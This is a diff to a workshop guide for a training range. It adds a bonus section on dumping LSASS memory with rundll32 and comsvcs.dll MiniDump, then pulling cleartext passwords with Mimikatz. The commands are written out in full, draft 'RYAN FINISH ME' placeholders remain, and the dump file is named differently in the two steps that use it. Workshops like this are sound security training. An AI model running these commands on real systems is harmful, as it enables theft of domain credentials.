@@ -1,7 +1,7 @@
 # Credential Grabbing
 
 In this workshop, you will be acting as the threat actor (TA). To begin, you will be connecting to the "Lighteater" system within the range. This system serves as the external system from which the TA begins their attack.
-- Yes, this system is technically on the same network as the rest of the servers. You're pretending as though it's external to the network. So plet's play pretend and move along ;).
+- Yes, this system is technically on the same network as the rest of the servers. You're pretending as though it's external to the network. So let's play pretend and move along ;).
 
 ## Initial Connections
 
@@ -192,23 +192,53 @@ More importantly, you now have the cleartext password of the domain admin accoun
 
 ## BONUS 1: LOLBIN Method
 
-RYAN, FILL ME OUT.
+The Local Security Authority Subsystem Service (LSASS) process, `lsass.exe`, is essentially the gatekeeper in terms of security and credential checks within Windows. Credentials that live in memory typically reside in the memory pages allocated to this process. As such, TAs often like to dump LSASS memory in order to analyze it offline. For example, the LSASS process space can be dumped and then loaded in Mimikatz. While we are not covering this officially in the workshop, we wanted to provide an example that you can follow when you'd like to learn to on your own.
 
-BRANDON> You can detect the get-proc lsass or minidump if you'd like, but this is meant more as a bonus for students.
+Many methods exist to dump LSASS, but we'll be covering a method that uses a LOLBIN method known as MiniDump, a function included in the `comsvcs.dll` library.
 
-1. in an local admin powershell:
-```
-get-process lsass
+1. Beginning in an admin-elevated PowerShell console, obtain the process ID (PID) for the `lsass.exe` process:
 
-rundll32.exe c:\Windows\system32\comsvcs.dll, MiniDump <pid> C:\Windows\temp\mini.dump full
-```
+    ```
+    get-process lsass
+    ```
 
-2. In mimikatz (this can be done "offline")
-```
-mimikatz # sekurlsa::minidump lsass.dmp
-mimikatz # sekurlsa::logonPasswords full
+    Example output:
+    
+    ```
+    Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+    -------  ------    -----      -----     ------     --  -- -----------
+       1850      30    10916      24148              1372   0 lsass
+    ```
 
-```
+    **Note that the number listed in the "Id" column, the PID, will most likely be different for you.** Take note of the PID returned when you run your command, as you'll need it in the next step.
+
+1. Ensuring you are still in an elevated prompt, use RunDLL to load the exported function "MiniDump" from the `comsvcs.dll` library. Ensure to replace `[PID]` with the PID of `lsass.exe` running on your system, which you obtained in the previous step.
+    
+    ```
+    rundll32.exe c:\Windows\system32\comsvcs.dll, MiniDump [PID] C:\Windows\temp\mini.dump full
+    ```
+    
+    - For example, in our test enviornment, the PID for LSASS was `1372`. Thus, we would want to run:
+    
+        ```
+        rundll32.exe c:\Windows\system32\comsvcs.dll, MiniDump 1372 C:\Windows\temp\mini.dump full
+        ```
+
+    !!! RYAN FINISH ME !!!
+    !!! RYAN FINISH ME !!!
+    !!! RYAN FINISH ME !!!
+
+1. In Mimikatz, and this can be done "offline", load the LSASS dump you obtained:
+    
+    ```
+    mimikatz # sekurlsa::minidump lsass.dmp
+    ```
+
+1. Now that you have loaded the dumped LSASS memory space, you can now run Mimikatz against the dump file:
+
+    ```
+    mimikatz # sekurlsa::logonPasswords full
+    ```
 
 ----
 
